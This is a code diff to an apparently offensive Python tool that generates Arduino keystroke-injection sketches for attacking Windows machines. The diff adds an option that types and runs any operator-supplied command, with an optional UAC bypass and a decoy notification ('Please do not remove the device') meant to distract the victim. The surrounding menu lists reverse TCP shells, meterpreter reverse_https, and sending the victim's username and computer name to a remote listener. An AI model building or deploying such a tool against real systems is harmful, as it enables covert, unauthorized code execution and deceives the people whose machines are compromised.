@@ -35,6 +35,8 @@ def WinMenu():
   menu['9']="Reverse TCP CMD prompt for Windows"
   menu['10']="windows/meterpreter/reverse_https in Powershell for Windows"
   menu['11']="Get username and computer name and send to a remote listener for Windows"
+  menu['12']="Execute custom Command Prompt payload for Windows"
+
   menu['42']="Return to main menu"
   menu['99']="Exit"
   
@@ -68,6 +70,8 @@ def WinMenu():
 	    WinOption10()
     elif selection == '11':
       WinOption11()
+    elif selection == '12':
+      WinOption12()
     elif selection == '42': 
       coreUtils.clearScreen()	
       break
@@ -82,7 +86,7 @@ def notificationBubble():
   message = "Please do not remove the device"
   while True:
 
-    answer = raw_input("Do you want to include a notifiction bubble as a distraction? Press Enter for default Yes (Y/n/?):  ")
+    answer = raw_input("Do you want to include a notifiction bubble as a distraction? Press Enter for default bubble settings, Yes to customize (Y/n/?):  ")
     
     if answer in ('Y','y','yes','Yes','YES'):
     
@@ -1540,3 +1544,103 @@ def WinOption11():
     payloadFunc = "userAndComputer();\n"
 
     WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble)
+
+def WinOption12():
+
+  done = False
+  looper = False
+  customCMD = ""
+  fileName=""
+  bypassUACoption=""
+  bubbleSetting=""
+
+  while looper != True:
+  
+    coreUtils.clearScreen()
+    print "********************************************************************************************"
+    print "*                                                                                          *"
+    print "*                             Custom Command Prompt Payload                                *"
+    print "*              This payload will execute a custom command prompt payload                   *"
+    print "*                   Options are: 1. CMD code 2. The output File name                       *"
+    print "*                                                                                          *"
+    print "*                                                                                          *"
+    print "********************************************************************************************"
+    print "\n"
+
+    menu = {}
+    menu['0'] = "Info"
+    menu['1'] = "Set Command Prompt payload to execute"
+    menu['2'] = "Set bypassUAC mode"
+    menu['3'] = "Set Arduino sketch filename"
+    menu['4'] = "Set notification bubble option"
+    menu['5'] = "Write Arduino sketch"
+    menu['6'] = "Display Command Prompt payload"
+    menu['42']= "Return to previous menu"
+    menu['99']= "Exit"
+
+    options=menu.keys()
+    options.sort(key=int)
+    for entry in options: 
+      print entry, menu[entry]
+
+    print "\n\n"
+    if customCMD != "":
+      print "Command Prompt payload is set"
+    if bypassUACoption != "":
+      print "bypassUAC technique set to ->  " + bypassUACoption
+    if bubbleSetting != "":
+      print "Notification bubble set to -> " + bubbleSetting
+    if fileName != "":
+      print "Arduino filename set to ->  " + fileName
+    
+    selection=raw_input("\nPlease Select: ")
+
+    if selection =='1': 
+      customCMD = raw_input("Please input your custom CMD payload : ")
+    elif selection == '2': 
+      bypassUACoption,bypassUAC = checkUACBypass()
+    elif selection == '3':
+      fileName = coreUtils.getFileName('customCMD.ino')
+    elif selection == '4':
+      bubble, bubbleSetting = notificationBubble()
+    elif selection == '5':
+      if done == False:
+        print "\nYou have not set all the options"
+        raw_input("Press Enter to return to the menu and set all the options")
+      else:
+        looper = True
+    elif selection == '6':
+      if customCMD == "":
+        print "you have not entered a custom CMD payload yet"
+        raw_input("Please press enter to continue")
+        coreUtils.clearScreen()
+      else:
+        print "Custom CMD payload set as -> " + customCMD
+        raw_input("Please press enter to continue")
+    elif selection == '42': 
+      coreUtils.clearScreen()   
+      break
+    elif selection == '99':
+      exit()
+    elif selection == '0':
+      nfoCore.Win12info()
+    else: 
+      print "\n\n***That is not a valid option!***\n\n" 
+      
+    if customCMD != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
+      done = True
+  
+  if done == True and looper == True:
+    payload = "void customCMD(){\n"
+    payload += "Keyboard.println(\"" + customCMD + "\");\n"
+    payload += "  delay(100);\n"
+    payload += "  pressEnter();\n"
+    payload += "  Keyboard.println(\"exit\");\n"
+    payload += "  delay(100);\n"
+    payload += "  pressEnter();\n"
+    payload += "}\n"
+
+    payloadFunc = "customCMD();\n"
+
+
+    WinWriteFile(fileName, payloadFunc,bypassUAC,payload,bubble) 
